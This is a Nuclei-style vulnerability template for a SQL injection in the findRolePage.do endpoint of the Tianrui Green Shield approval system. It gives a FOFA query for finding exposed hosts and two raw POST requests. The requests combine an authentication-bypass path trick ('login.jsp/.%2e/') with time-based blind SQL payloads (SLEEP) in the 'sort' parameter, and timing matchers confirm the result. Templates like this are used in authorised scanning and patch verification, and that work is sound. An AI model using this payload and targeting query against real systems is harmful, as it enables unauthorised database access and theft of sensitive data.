id: tianrui-greenshield-findrolepage-sqli
info:
  name: 天锐绿盾审批系统 findRolePage.do 接口 SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="TIPPAY-绿盾审批系统"
      
      天锐绿盾审批系统在 findRolePage.do 接口的参数处理逻辑中存在 SQL 注入缺陷，攻击者可通过构造恶意输入执行非授权的 SQL 命令，导致数据库敏感信息泄露或业务逻辑篡改。该漏洞影响系统核心权限管理模块，可能引发横向渗透攻击。
  tags: 天锐绿盾审批系统findRolePage
http:
- raw:
  - |
    POST /trwfe/login.jsp/.%2e/role/findRolePage.do HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    sort=(SELECT 2005 FROM (SELECT(SLEEP(5)))IEWh)&order=asc
  - |
    POST /trwfe/login.jsp/.%2e/role/findRolePage.do HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    sort=(SELECT 2005 FROM (SELECT(SLEEP(8)))IEWh)&order=asc
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
